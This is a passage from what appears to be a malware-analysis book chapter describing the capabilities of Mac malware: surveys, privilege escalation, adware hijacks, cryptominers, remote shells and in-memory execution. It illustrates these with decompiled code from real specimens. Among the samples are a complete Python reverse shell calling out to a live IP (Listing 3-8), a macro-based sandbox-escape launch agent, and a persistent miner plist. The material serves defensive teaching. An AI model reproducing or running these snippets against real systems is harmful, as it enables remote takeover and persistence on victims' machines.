<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 3: Capabilities</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:a248aa67-aa2c-49b1-a34e-c916914c0e30" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_47" title="47"/>3</span><br/>
<span class="ChapterTitle">Capabilities</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">When analyzing malware, it’s often paramount to understand what happens after a successful infection. In other words, what does the malware actually do? Though the answer to this question will depend on a particular malware’s goals, it may include surveying the system, escalating privileges, executing commands, exfiltrating files, ransoming user files, or even mining cryptocurrency. In this chapter, we’ll take a detailed look at the capabilities commonly found in Mac malware. </p>
<h2 id="h1-501942c03-0001">Categorizing Mac Malware Capabilities</h2>
<p class="BodyFirst">A malware’s capabilities are largely dependent on the malware’s type. Generally speaking, we can place Mac malware into two broad categories: criminal and espionage. </p>
<p>Cybercriminals who create malware are largely motivated by a single factor: money! As such, malware that falls into this category possesses <span epub:type="pagebreak" id="Page_48" title="48"/>capabilities that seek to help the malware author profit, perhaps by displaying ads, hijacking search results, mining cryptocurrency, or encrypting user files for ransom. Adware falls into this category, as it’s designed to surreptitiously generate revenue for its creator. (The difference between adware and malware can be rather nuanced, and in many cases arguably imperceivable. As such, here, we won’t differentiate between the two.)</p>
<p>On the other hand, malware designed to spy on its victims (for example, by three-letter government agencies) is more likely to contain stealthier or more comprehensive capabilities, perhaps featuring the ability to record audio off the system microphone or expose an interactive shell to allow a remote attacker to execute arbitrary commands. </p>
<p>Of course, there are overlaps in the capabilities of these two broad categories. For example, the ability to download and execute arbitrary binaries is an appealing capability to most malware authors, as it provides the means to either update or dynamically expand their malicious creations (<a href="#figure3-1" id="figureanchor3-1">Figure 3-1</a>). </p>
<figure>
<img alt="A venn diagram in which the left side is labeled “Criminal” and the right side is labeled “Espionage.” The left side includes “Ads,” “Clicks,” and &quot;Ransom.” The right side includes “Shell,” “Video capture,” and “Audio capture.” The overlapping center includes “Keylogging,” “Surveys,” “Up/downloads,” and “Cmd execution.”" class="" src="image_fi/501942c03/f03001.png"/>
<figcaption><p><a id="figure3-1">Figure 3-1</a>: A categorization of malware’s capabilities</p></figcaption>
</figure>
<h2 id="h1-501942c03-0002">Survey and Reconnaissance</h2>
<p class="BodyFirst">In both crime-oriented and espionage-oriented malware, we often find logic designed to conduct surveys or reconnaissance of a system’s environment, for two main reasons. First, this gives the malware insight into its surroundings, which may drive subsequent decisions. For example, malware may choose not to persistently infect a system if it detects third-party security tools. Or, if it finds itself running with non-root privileges, it may attempt to escalate its privileges (or perhaps simply skip actions that require such rights). Thus, the malware often executes reconnaissance logic before any other malicious actions are taken. </p>
<p>Second, malware may transmit the survey information it collects back to the attacker’s command and control server, where the attacker may use it to uniquely identify the infected system (usually by finding some system-specific unique identifier) or pinpoint infected computers of interest. In <span epub:type="pagebreak" id="Page_49" title="49"/>the latter case, what initially may appear to be an indiscriminate attack of thousands of systems may in reality be a highly targeted campaign, where, based on the survey information, the attacker will eventually abandon the majority of infected systems. </p>
<p>Let’s briefly look at some specific survey capabilities found in several Mac malware specimens. Where relevant, I’ll note how the attacker uses this survey data. We’ll start with a version of the Proton malware. Once Proton has made its way onto a Mac, it surveys the system in order to determine if any third-party firewalls are installed. If it finds one, the malware will not persistently infect the system and instead simply exits. Why? Such firewall products would likely alert the user to the presence of the malware when it attempts to connect to its command and control server. Thus, the malware authors decided it would be wiser to skip persistently infecting such systems, rather than risk detection.</p>
<p>Proton’s survey logic detects firewalls by checking for the presence of files associated with specific firewall products. For example, in the following snippet of the malware’s decompiled code, we find a check for a kernel extension that belongs to the popular LittleSnitch firewall (<a href="#listing3-1" id="listinganchor3-1">Listing 3-1</a>):</p>
<pre><code>//string at index 0x51: '/Library/Extensions/LittleSnitch.kext'<br/><span aria-label="annotation1" class="CodeAnnotationHang">1</span> path = [paths objectAtIndexedSubscript:0x51]; <br/><span aria-label="annotation2" class="CodeAnnotationHang">2</span> if (YES == [NSFileManager.defaultManager fileExistsAtPath:path]) <br/>{<br/>   exit(0x0);<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing3-1">Listing 3-1</a>: Detection of the LittleSnitch firewall (Proton)</p>
<p>Here, the malware first extracts a path to Little Snitch’s kernel extension from an embedded dictionary of hard-coded paths <span aria-label="annotation1" class="CodeAnnotation">1</span>. It then checks if the kernel extension is found on the system, via the <code>fileExistsAtPath</code> API. If the kernel extension is indeed found, this implies the firewall is installed, which triggers the malware to prematurely exit <span aria-label="annotation2" class="CodeAnnotation">2</span>. </p>
<p>MacDownloader is another Mac malware specimen containing survey capabilities. Unlike Proton, its goal is not so much about actionable reconnaissance, but rather to collect detailed information about the infected system to send to the remote attackers. As an <em>Iran Threats</em> blog post about the malware notes, this information includes the user’s <em>keychains</em> (which contain passwords, certificates, and more), as well as details about “the running processes, installed applications, and the username and password which are acquired through a fake System Preferences dialog.”<sup class="endnote"><a href="#c03-endnote-1" id="c03-noteref-1">1</a></sup></p>
<p>Dumping the Objective-C class information, which we’ll cover in <span class="xref" itemid="xref_target_Chapter 5">Chapter 5</span>, from the malware’s binary <em>Bitdefender Adware Removal Tool</em> reveals various descriptive methods responsible for performing and exfiltrating the survey (<a href="#listing3-2" id="listinganchor3-2">Listing 3-2</a>): </p>
<pre><code>% <b>class-dump "Bitdefender Adware Removal Tool"</b><br/>...<br/>- (id)getKeychainsFilePath;<br/>- (id)getInstalledApplicationsList;<br/><span epub:type="pagebreak" id="Page_50" title="50"/>- (id)getRunningProcessList;<br/>- (id)getLocalIPAddress;<br/>- (void)saveSystemInfoTo:(id)arg1 withRootUserName:(id)arg2 andRootPassword:(id)arg3;<br/>- (BOOL)SendCollectedDataTo:(id)arg1 withThisTargetId:(id)arg2;</code></pre>
<p class="CodeListingCaption"><a id="listing3-2">Listing 3-2</a>: Survey-related methods (MacDownloader)</p>
<p>Before MacDownloader sends the collected survey to the attackers, it saves it to a local file, <em>/tmp/applist.txt</em>. Running the malware in a virtual machine allows us to capture the results of the survey by examining this file (<a href="#listing3-3" id="listinganchor3-3">Listing 3-3</a>):</p>
<pre><code>"OS version: Darwin users-Mac.local 16.7.0 Darwin Kernel Version 16.7.0: Thu Jun 15 17:36:27 PDT 2017; root:xnu-3789.70.16~2\/RELEASE_X86_64 x86_64",<br/><br/>"Root Username: \"user\"",<br/>"Root Password: \"hunter2\"",<br/>...<br/>[<br/>"Applications\/App%20Store.app\/",<br/>"Applications\/Automator.app\/",<br/>"Applications\/Calculator.app\/",<br/>"Applications\/Calendar.app\/",<br/>"Applications\/Chess.app\/",<br/>...<br/>]<br/>"process name is: Dock\t PID: 254 Run from: file:\/\/\/System\/Library\/CoreServices\/Dock.app\/Contents\/MacOS\/Dock",<br/>"process name is: Spotlight\t PID: 300 Run from: file:\/\/\/System\/Library\/CoreServices\/Spotlight.app\/Contents\/MacOS\/Spotlight",<br/>"process name is: Safari\t PID: 972 Run from: file:\/\/\/Applications\/Safari.app\/Contents\/MacOS\/Safari"...</code></pre>
<p class="CodeListingCaption"><a id="listing3-3">Listing 3-3</a>: A survey (MacDownloader)</p>
<p>As you can see, this survey information includes basic version information about the infected machine, the user’s root password, installed applications, and a list of running applications. </p>
<h2 id="h1-501942c03-0003">Privilege Escalation</h2>
<p class="BodyFirst">During an initial survey of a newly infected machine, malware often queries its runtime environment to ascertain its privilege level. When malware initially gains the ability to execute code on a target system, it often finds itself running within a sandbox, or in the context of the currently logged-in user, rather than as root. Generally, it will want to escape any sandbox or elevate its privileges to root so that it can more comprehensively interact with the infected system and perform privileged actions.</p>
<h3 id="h2-501942c03-0001">Escaping Sandboxes</h3>
<p class="BodyFirst">Though malware that leverages sandbox escapes is rare, as these escapes generally require an exploit, we can find an example of this in a malicious <span epub:type="pagebreak" id="Page_51" title="51"/>Microsoft Office document from 2018. Titled <em>BitcoinMagazine-Quidax_InterviewQuestions_2018,</em> this document contained malicious macros that ran automatically when the file was opened in Microsoft Word, if the user had enabled macros. Examining the malicious document reveals an embedded Python script containing logic to download and execute Metasploit’s Meterpreter.</p>
<p>However, macOS sandboxes documents, so any code they execute finds itself running in a highly restricted, low-privileged environment. Or does it? Taking a closer look at the document’s malicious macro code reveals logic to create an interestingly named launch agent property list, <em>~$com.xpnsec.plist</em> (<a href="#listing3-4" id="listinganchor3-4">Listing 3-4</a>): </p>
<pre><code># <b>olevba -c "BitcoinMagazine-Quidax_InterviewQuestions_2018.docm"</b><br/><br/>VBA MACRO NewMacros.bas <br/>in file: word/vbaProject.bin<br/>- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -<br/>...<br/>path = Environ("HOME") &amp; "/../../../../Library/LaunchAgents/~$com.xpnsec.plist"<br/>arg = "&lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;\n" &amp; _<br/>"&lt;!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""&gt;\n" &amp; _<br/>"&lt;plist version=""1.0""&gt;\n" &amp; _<br/>"&lt;dict&gt;\n" &amp; _<br/>"&lt;key&gt;Label&lt;/key&gt;\n" &amp; _<br/>"&lt;string&gt;com.xpnsec.sandbox&lt;/string&gt;\n" &amp; _<br/>"&lt;key&gt;ProgramArguments&lt;/key&gt;\n" &amp; _<br/>"&lt;array&gt;\n" &amp; _<br/>"&lt;string&gt;python&lt;/string&gt;\n" &amp; _<br/>"&lt;string&gt;-c&lt;/string&gt;\n" &amp; _<br/>"&lt;string&gt;" &amp; payload &amp; "&lt;/string&gt;" &amp; _<br/>"&lt;/array&gt;\n" &amp; _<br/>"&lt;key&gt;RunAtLoad&lt;/key&gt;\n" &amp; _<br/>"&lt;true/&gt;\n" &amp; _<br/>"&lt;/dict&gt;\n" &amp; _<br/>"&lt;/plist&gt;"<br/>Result = system("echo """ &amp; arg &amp; """ &gt; '" &amp; path &amp; "'", "r")</code></pre>
<p class="CodeListingCaption"><a id="listing3-4">Listing 3-4</a>: Escaping the sandbox via a launch agent </p>
<p>Due to a vulnerability in older versions of Microsoft Word on macOS, programs can create launch agents property lists prefixed with <code>~$</code>, such as <em>~$com.xpnsec.plist</em>, from within a sandbox. Such plists can instruct macOS to load a launch agent that will run outside the sandbox the next time the user logs in. Armed with this escape, the Meterpreter payload can gain execution outside the constrictive sandbox, allowing the attacker far wider access to the infected system. For more detailed analysis of the <em>BitcoinMagazine-Quidax_InterviewQuestions_2018</em> document and the sandbox escape it exploited, see my write-ups: “Word to Your Mac: Analyzing a Malicious Word Document Targeting macOS Users” and “Escaping the Microsoft Office Sandbox.”<sup class="endnote"><a href="#c03-endnote-2" id="c03-noteref-2">2</a></sup></p>
<h3 id="h2-501942c03-0002"><span epub:type="pagebreak" id="Page_52" title="52"/>Gaining Root Privileges</h3>
<p class="BodyFirst">Once outside the sandbox (or if the sandbox was never an issue, as is often the case when a user directly runs the malware), the malware often attempts to gain root privileges. Armed with root privileges, malware can perform more invasive and stealthier actions that would otherwise be blocked.</p>
<p>Malware can escalate its privileges using several methods, the first of which is to simply ask the user! For example, during the installation of a package (a <em>.pkg </em>file), actions that require root privileges will automatically trigger an authorization prompt. As shown in <a href="#figure3-2" id="figureanchor3-2">Figure 3-2</a>, when a package trojanized with EvilQuest is opened, the malware’s installation logic will trigger such a prompt.</p>
<figure>
<img alt="The prompt says “Installer is trying to install new software. Enter your password to allow this,” and it is followed by the space to select your User Name and type in your Password. Two buttons, Cancel and Install Software, are directly beneath this." class="keyline" src="image_fi/501942c03/f03002.png"/>
<figcaption><p><a id="figure3-2">Figure 3-2</a>: An authorization prompt (EvilQuest)</p></figcaption>
</figure>
<p>As users are often prompted for their administrative credentials during package installations, and as the prompt originates from the context of the system’s installer application, most users will comply, thus handing the malware root privileges.</p>
<p>If the malware isn’t distributed as a package, it can also request elevated privileges by invoking various system APIs. For example, the deprecated macOS <code>AuthorizationExecuteWithPrivileges</code> API will run an executable with root privileges after a user has provided the necessary credentials. One example of malware that leverages this API is ColdRoot, which invokes it in a function aptly named (though misspelled) <code>LETMEIN_$$_EXEUTEWITHPRIVILEGES</code> (<a href="#listing3-5" id="listinganchor3-5">Listing 3-5</a>):</p>
<pre><code>LETMEIN_$$_EXEUTEWITHPRIVILEGES(...) {<br/> <br/>  AuthorizationCreate(...);<br/>  AuthorizationCopyRights(...);<br/>  AuthorizationExecuteWithPrivileges(..., path2self, ...);</code></pre>
<p class="CodeListingCaption"><a id="listing3-5">Listing 3-5</a>: Invocation of the <code>AuthorizationExecuteWithPrivileges</code> API (ColdRoot)</p>
<p><span epub:type="pagebreak" id="Page_53" title="53"/>The invocation of the API generates a system request for the user to authenticate so that the malware can run itself as root (<a href="#figure3-3" id="figureanchor3-3">Figure 3-3</a>).</p>
<figure>
<img alt="The prompt states “com.apple.audio.driver2 wants to make changes. Enter your password to allow this.” Spaces to enter one’s User Name and Password follow, and buttons labeled Cancel and OK are directly below this." class="keyline" src="image_fi/501942c03/f03003.png"/>
<figcaption><p><a id="figure3-3">Figure 3-3</a>: An authorization prompt, via the <span class="LiteralInCaption"><code>AuthorizationExecuteWithPrivileges</code></span> API (ColdRoot)</p></figcaption>
</figure>
<p>More sophisticated malware may seek to gain root or even kernel access to perform privileged actions via elevation-of-privilege exploits. In 2014, researchers at FireEye discovered the XSLCmd malware.<sup class="endnote"><a href="#c03-endnote-3" id="c03-noteref-3">3</a></sup> Though it was a fairly standard backdoor, it contained an initially overlooked zero-day exploit that allowed it to globally capture all keystrokes on an infected system. At the time, the current version of Mac OS X required the enablement of assistive devices in order for a program to globally capture keystrokes. A program could enable these devices by creating the file <em>/var/db/.AccessibilityAPIEnabled</em>. However, this file creation required root privileges. </p>
<p>To circumvent this requirement, the malware, which was running with normal user privileges, abused macOS’s <code>Authenticator</code> and <code>UserUtilities</code> classes to send a message to the <em>writeconfig.xpc</em> service. This service, which ran with root privileges, did not authenticate clients and so allowed any program to connect to it and request the execution of privileged actions. Thus, the malware could coerce the service to create the file needed to enable assistive devices (<em>/var/db/.AccessibilityAPIEnabled</em>), allowing global keylogging to commence (<a href="#listing3-6" id="listinganchor3-6">Listing 3-6</a>):</p>
<pre><code>void sub_10000c007(...) {<br/><br/>  auth = [Authenticator sharedAuthenticator];<br/>   sfAuth = [SFAuthorization authorization]; <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/> <br/>  [sfAuth obtainWithRight:"system.preferences" flags:0x3 error:0x0];<br/>   [auth authenticateUsingAuthorizationSync:sfAuth]; <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/>  ...<br/>  attrs = [NSDictionary dictionaryWithObject:@(444o) <br/>                        forKey:NSFilePosixPermissions]; <br/><br/>  data = [NSData dataWithBytes:"a" length:0x1];<br/>  [UserUtilities createFileWithContents:data <br/>                       path:@"/var/db/.AccessibilityAPIEnabled" attributes:attrs]; <span aria-label="annotation3" class="CodeAnnotationCode">3</span></code></pre>
<p class="CodeListingCaption"><a id="listing3-6">Listing 3-6</a>: Exploitation of a writeconfig XPC service zero-day (XSLCmd)</p>
<p><span epub:type="pagebreak" id="Page_54" title="54"/>In this code snippet, decompiled from XSLCmd’s binary, we see the malware first instantiating two system classes <span aria-label="annotation1" class="CodeAnnotation">1</span>. Once authenticated <span aria-label="annotation2" class="CodeAnnotation">2</span>, it invokes a system <code>UserUtilities</code> class method, which instructs the <em>writeconfig.xpc</em> service to create the <em>.AccessibilityAPIEnabled</em> file on its behalf <span aria-label="annotation3" class="CodeAnnotation">3</span>. </p>
<p>Let’s briefly look at another example of malicious code abusing an elevation-of-privilege exploit to execute privileged actions. In 2015, Adam Thomas of Malwarebytes uncovered an adware installer exploiting a known, and at-the-time unpatched, zero-day vulnerability. The vulnerability, originally discovered by the security researcher Stefan Esser, allowed unprivileged code to execute privileged commands (without needing a root password).<sup class="endnote"><a href="#c03-endnote-4" id="c03-noteref-4">4</a></sup> The adware weaponized this flaw to modify the <em>sudoers</em> file, which as Thomas Reed notes, “allows shell commands to be executed as root using sudo, without the usual requirement for entering a password.”<sup class="endnote"><a href="#c03-endnote-5" id="c03-noteref-5">5</a></sup></p>
<p>Recent versions of macOS have additional security mechanisms to ensure that even if malware obtains root privileges, it may still be prevented from performing indiscriminate actions. But in order to circumvent these security mechanisms, malware may leverage exploits or attempt to coerce the user to manually circumvent them. It seems reasonable to assume that we’ll see more escalation-of-privilege exploits in the future.</p>
<h2 id="h1-501942c03-0004">Adware-related Hijacks and Injections </h2>
<p class="BodyFirst">The average Mac user is unlikely to be targeted by sophisticated cyber-espionage attackers wielding zero-days. Instead, they are far more likely to fall prey to simpler adware-related attacks. Compared to other types of Mac malware, adware is rather prolific. Its goal is generally to make money for its creators, often through ads or hijacked search results backed by affiliate links. </p>
<p>For example, in 2017 I analyzed a piece of adware called Mughthesec that masqueraded as a Flash Installer.<em> </em>The application would install various adware, including a component named <em>Safe Finder</em> that would hijack Safari’s home page, setting it to point to an affiliate-driven search page (<a href="#figure3-4" id="figureanchor3-4">Figure 3-4</a>).</p>
<figure>
<img alt="Safari’s general settings show options to set web pages as defaults, including “Safari opens with,” “New windows open with,” “New tabs open with,” and “Homepage.” Homepage is no longer set to the default, and is instead set to http://default27061330-a.akamaih." class="keyline" src="image_fi/501942c03/f03004.png"/>
<figcaption><p><a id="figure3-4">Figure 3-4</a>: Safari’s homepage hijacked (Mughthesec/Safe Finder)</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_55" title="55"/>On an infected system, opening Safari confirms that the home page has been hijacked, though in a seemingly innocuous way: it simply displays a rather blank-looking search page (<a href="#figure3-5" id="figureanchor3-5">Figure 3-5</a>). However, looking at the page source reveals the inclusion of several Safe Finder scripts.</p>
<figure>
<img alt="The new home page is a white screen with a search button in the center. The page source shows various Safe Finder scripts included in its code." class="keyline" src="image_fi/501942c03/f03005.png"/>
<figcaption><p><a id="figure3-5">Figure 3-5</a>: An infected user’s new home page (Mughthesec/Safe Finder)</p></figcaption>
</figure>
<p>This hijacked home page funnels user searches through various affiliates before they’re finally serviced by Yahoo! Search, and it injects Safe Finder logic into all search results. The ability to manipulate search results likely generates revenue for the adware authors via ad views and affiliate links.</p>
<p>Another ad-related example, IPStorm, is a cross-platform botnet with a macOS variant discovered in 2020. In a report by Intezer, researchers noted that the Linux version of IPStorm engages in fraudulent activities, “abusing gaming and ads monetization. Because it’s a botnet, the malware utilizes the large amount of requests from different trusted sources, thus not being blocked nor traceable.”<sup class="endnote"><a href="#c03-endnote-6" id="c03-noteref-6">6</a></sup> By sniffing its network traffic, we can confirm that the macOS variant also engages in activities including fraudulent ad monetization (<a href="#figure3-6" id="figureanchor3-6">Figure 3-6</a>).</p>
<figure>
<img alt="A network capture of IPStorm has four columns: Source, Destination, Protocol, and Info. In the Info column, there are various HTTP GET requests, including one for a web page describing a personal injury attorney. " class="keyline" src="image_fi/501942c03/f03006.png"/>
<figcaption><p><a id="figure3-6">Figure 3-6</a>: A network capture of fraudulent ad monetization (IPStorm)</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_56" title="56"/>For an interesting deep dive into adware and its ties to affiliate programs, see “<a class="LinkURL" href="http://www.benedelman.org/news-091405/">How Affiliate Programs Fund Spyware</a>.”<sup class="endnote"><a href="#c03-endnote-7" id="c03-noteref-7">7</a></sup></p>
<h2 id="h1-501942c03-0005">Cryptocurrency Miners</h2>
<p class="BodyFirst">We’ve already discussed how most of the malware that infects the average Mac user is likely motivated by financial gain. The late 2010s saw a large uptick in Mac malware that seeks to stealthily install cryptocurrency mining software on Mac systems. Cryptocurrency mining, which involves both the process of creating new digital “coins” and verifying user transactions, requires large amounts of processing resources in order to generate any meaningful revenue. Malware authors solve this resource dilemma by distributing mining operations across many infected systems. </p>
<p>In practice, malware that implements cryptocurrency payloads often does so in a rather lazy, albeit efficient way: by packaging up command line versions of legitimate miners. For example, the <a class="LinkURL" href="https://objective-see.com/blog/blog_0x29.html">CreativeUpdate</a> malware, which attackers surreptitiously distributed via the popular Mac application website <a class="LinkURL" href="http://MacUpdate.com">MacUpdate.com</a>, leveraged a legitimate cryptocurrency miner. This malware persisted as a launch agent, <em>MacOS.plist</em>, which in the following snippet (<a href="#listing3-7" id="listinganchor3-7">Listing 3-7</a>) we can see instructs the system to persistently execute a binary named <code>mdworker</code> via the shell (<code>sh</code>):</p>
<pre><code>...<br/>&lt;key&gt;ProgramArguments&lt;/key&gt;<br/>&lt;array&gt;<br/>  &lt;string&gt;sh&lt;/string&gt;<br/>  &lt;string&gt;-c&lt;/string&gt;<br/>  &lt;string&gt;<br/>      ~/Library/mdworker/<b>mdworker</b><br/>      -user walker18@protonmail.ch -xmr<br/>  &lt;/string&gt;<br/>&lt;/array&gt;<br/>&lt;key&gt;RunAtLoad&lt;/key&gt;<br/>&lt;true/&gt;<br/>...</code></pre>
<p class="CodeListingCaption"><a id="listing3-7">Listing 3-7</a>: A persistent launch item plist (CreativeUpdate)</p>
<p>If we directly execute this <code>mdworker</code> binary in a virtual machine, it readily identifies itself as a console miner, belonging to the multicurrency mining platform MinerGate (<a href="#listing3-7">Listing 3-7</a>):<sup class="endnote"><a href="#c03-endnote-8" id="c03-noteref-8">8</a></sup></p>
<pre><code>% <b>./mdworker -help</b><br/>  Usage:<br/>  minergate-cli [-<var>&lt;version&gt;</var>] -user <var>&lt;email&gt;</var> [-proxy <var>&lt;url&gt;</var>] <br/>                -<var>&lt;currency&gt; &lt;threads&gt;</var> [<var>&lt;gpu intensity&gt;</var>] </code></pre>
<p>The launch agent plist passes this persisted miner the arguments <code>-user walker18@protonmail.ch -xmr</code>, specifying the user account to which to credit the mining results as well as the type of cryptocurrency to mine, XMR (Monero).</p>
<p><span epub:type="pagebreak" id="Page_57" title="57"/>Other recent examples of Mac malware used to surreptitiously mine cryptocurrencies include OSAMiner, BirdMiner, CpuMeaner, DarthMiner, and CookieMiner.</p>
<h2 id="h1-501942c03-0006">Remote Shells</h2>
<p class="BodyFirst">Sometimes all an attacker wants is a shell on a victim’s system. Shells afford a remote attacker complete control of an infected system by allowing them to run arbitrary shell commands and binaries. </p>
<p>In the context of malware, remote shells generally come in two main types: interactive and non-interactive. <em>Interactive </em>shells provide a remote attacker the ability to “go live” on an infected system, as if they were physically sitting in front of it. Through such a shell, the attacker can run and interrupt shell commands, all the while routing all input and output to and from the attacker’s remote server in real time. <em>Non-interactive</em> shells still provide a mechanism for an attacker to run commands via the infected system’s built-in shell. However, they often just receive commands from an attacker’s remote command and control server and execute them at specified intervals.</p>
<p>Malware that sets up and executes a remote shell doesn’t have to be fancy. For example, the malware known as Dummy ran a bash script (<em>/var/root/script.sh</em>), persisted it as a launch daemon, and used it to execute an inline Python script (<a href="#listing3-8" id="listinganchor3-8">Listing 3-8</a>): </p>
<pre><code>#!/bin/bash<br/>while :<br/>do<br/>     python -c 'import socket,subprocess,os; <br/><br/>     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br/>   <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> s.connect(("185.243.115.230",1337)); <br/><br/>     os.dup2(s.fileno(),0); <br/>     os.dup2(s.fileno(),1); <br/>   <span aria-label="annotation2" class="CodeAnnotationCode2">2</span> os.dup2(s.fileno(),2); <br/><br/>   <span aria-label="annotation3" class="CodeAnnotationCode2">3</span> p=subprocess.call(["/bin/sh","-i"]);' <br/>     sleep 5<br/>done</code></pre>
<p class="CodeListingCaption"><a id="listing3-8">Listing 3-8</a>: A persistent remote shell (Dummy)</p>
<p>Dummy’s Python code will attempt to connect to the IP address <code>185.243.115.230</code> on port <code>1337</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>. It then duplicates <code>STDIN</code> (<code>0</code>), <code>STDOUT</code> (<code>1</code>), and <code>STDERR</code> (<code>2</code>) to the connected socket <span aria-label="annotation2" class="CodeAnnotation">2</span> before executing <code>/bin/sh</code><em> </em>with the interactive mode <code>-i</code> flag <span aria-label="annotation3" class="CodeAnnotation">3</span>. In other words, it’s setting up a remotely interactive reverse shell.</p>
<p>A persistently running instance of <em>/bin/sh</em> connected to a remote IP address is fairly easy to uncover on an infected system. Therefore, more <span epub:type="pagebreak" id="Page_58" title="58"/>sophisticated malware might implement these capabilities programmatically to remain stealthier. For example, a Lazarus Group backdoor can remotely execute shell commands using a function named <code>proc_cmd</code> (<a href="#listing3-9" id="listinganchor3-9">Listing 3-9</a>):</p>
<pre><code>int proc_cmd(char * arg0, ...) {<br/><br/>     bzero(&amp;command, 0x400);<br/>   <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> sprintf(&amp;command, "%s 2&gt;&amp;1 &amp;", arg0); <br/>   <span aria-label="annotation2" class="CodeAnnotationCode2">2</span> rax = popen(&amp;command, "r"); <br/>     ...<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing3-9">Listing 3-9</a>: Command execution via the <code>popen</code> API (Lazarus Group backdoor) </p>
<p>In the <code>proc_cmd</code> function, we can see that the backdoor first builds the command to execute in the background <span aria-label="annotation1" class="CodeAnnotation">1</span>. Then it invokes the <code>popen</code> system API, which in turn invokes the shell (<em>/bin/sh</em>) in order to execute the specified command <span aria-label="annotation2" class="CodeAnnotation">2</span>. Though non-interactive, this code still provides the means for a remote attacker to execute arbitrary shell commands on an infected system. </p>
<h2 id="h1-501942c03-0007">Remote Process and Memory Execution</h2>
<p class="BodyFirst">Executing commands via the shell is rather noisy and thus more likely to lead to detection. More sophisticated malware may bypass the shell and instead contain logic to directly execute processes on the infected system. For example, the Komplex malware can execute arbitrary binaries using programmatic APIs. If we extract symbols from malware, we find a custom <code>FileExplorer</code> class that has a method named <code>executeFile</code>, as shown in <a href="#listing3-10" id="listinganchor3-10">Listing 3-10</a>:</p>
<pre><code>% <b>nm -C Komplex/kextd</b><br/>...<br/>0000000100001e60 T FileExplorer::executeFile(char const*, unsigned long)</code></pre>
<p class="CodeListingCaption"><a id="listing3-10">Listing 3-10</a>: A file execution method (Komplex)</p>
<p>Decompiling this method shows that it calls Apple’s <code><a class="LinkURL" href="https://developer.apple.com/documentation/foundation/nstask">NSTask</a></code> APIs to execute the specified binary (<a href="#listing3-11" id="listinganchor3-11">Listing 3-11</a>):</p>
<pre><code>FileExplorer::executeFile(...) {<br/>   ...  <br/>   path = [NSString stringWithFormat:@"%s/%s", <br/>         <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> directory, FileExplorer::getFileName()]; <br/><br/>  <span aria-label="annotation2" class="CodeAnnotationCode2">2</span> NSTask* task = [[NSTask alloc] init]; <br/>   [task setLaunchPath:path];<br/>   [task launch];<br/>   [task waitUntilExit];<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing3-11">Listing 3-11</a>: File execution logic (Komplex)</p>
<p><span epub:type="pagebreak" id="Page_59" title="59"/>Looking at the decompilation of <code>FileExplorer</code>’s <code>executeFile</code> method, we see it first builds a string object (<code>NSString</code>) containing the full path to the file to execute <span aria-label="annotation1" class="CodeAnnotation">1</span>, and then it initializes a task object (<code>NSTask</code>) to execute it <span aria-label="annotation2" class="CodeAnnotation">2</span>.</p>
<p>Spawning a process is still a noisy event, so certain malware authors choose instead to execute binary code <em>directly from memory</em>. You can see this strategy at work in a Lazarus Group implant from 2019, AppleJeus.C (<a href="#listing3-12" id="listinganchor3-12">Listing 3-12</a>). </p>
<pre><code>int memory_exec2(void* bytes, int size, ...) {<br/>    ...<br/>    NSCreateObjectFileImageFromMemory(bytes, size, &amp;objectFile); <br/>    NSLinkModule(objectFile, "core", 0x3); <br/>    ...</code></pre>
<p class="CodeListingCaption"><a id="listing3-12">Listing 3-12</a>: In-memory code execution (Lazarus Group backdoor)</p>
<p>The malware calls a function named <code>memory_exec2</code> with various parameters, such as a remote payload that has been downloaded and decrypted only in memory. As shown in the code snippet, the function invokes the Apple <code>NSCreateObjectFileImageFromMemory</code> and <code>NSLinkModule</code> APIs to prepare the in-memory payload for execution. The malware then dynamically locates and calls into the entry point of the now-prepared payload. This advanced capability ensures that the malware’s second-stage payloads never touch the filesystem, nor result in new processes being spawned. Stealthy indeed!</p>
<p>Interestingly, it appears that the Lazarus Group simply took this in-memory payload code from a blog post and GitHub project by Cylance, an antivirus firm that also conducts threat research. To the malware authors, the use of this open source malware provided several benefits, including efficiency (it’s already written!) and a more complicated attribution. For a technical deep dive into the in-memory loading capabilities of the Lazarus Group implant, see my write-up “Lazarus Group Goes ‘Fileless.’”<sup class="endnote"><a href="#c03-endnote-9" id="c03-noteref-9">9</a></sup></p>
<h2 id="h1-501942c03-0008">Remote Download and Upload</h2>
<p class="BodyFirst">Another common malware capability, especially of the cyberespionage variety, is the remote downloading of files from the attacker’s server or the uploading of collected data from an infected system, called <em>exfiltration</em>.</p>
<p>Malware often includes the ability to remotely download files onto an infected system to afford the attacker the ability to upgrade the malware or download and execute secondary payloads and other tools. The WindTail malware illustrates this capability well. Designed as a file exfiltration cyberespionage implant, WindTail also has the ability to download, then execute, additional payloads from the attacker’s remote command and control server. The logic that implements the file download capability is found within a method named <code>sdf</code>. This method first decrypts an embedded address for a command and control server. Following this, it makes an initial request to this server to get a local name for the file it’s about to download. A second request downloads the actual file from the remote server.</p>
<p><span epub:type="pagebreak" id="Page_60" title="60"/>A network monitor such as my open source tool Netiquette shows the two connections made by WindTail to download the file (<a href="#listing3-13" id="listinganchor3-13">Listing 3-13</a>):</p>
